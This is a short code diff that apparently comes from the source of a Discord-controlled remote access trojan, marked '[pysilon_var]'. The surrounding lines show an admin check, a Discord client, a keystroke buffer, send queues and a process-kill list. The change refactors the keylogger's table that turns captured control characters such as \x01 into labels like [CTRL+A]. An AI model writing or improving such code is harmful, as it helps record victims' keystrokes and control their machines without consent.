@@ -109,7 +109,7 @@ if IsAdmin():
 client = discord.Client(intents=discord.Intents.all())
 # [pysilon_var] !opus_initialization 0
     
-ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
+ctrl_codes = dict({f"\\x{hex(i)[2:].zfill(2).upper()}": f'[CTRL+{chr(64 + i)}]' for i in range(1, 27)})
 text_buffor, force_to_send = '', False
 messages_to_send, files_to_send, embeds_to_send = [], [], []
 processes_messages, processes_list, process_to_kill = [], [], ''
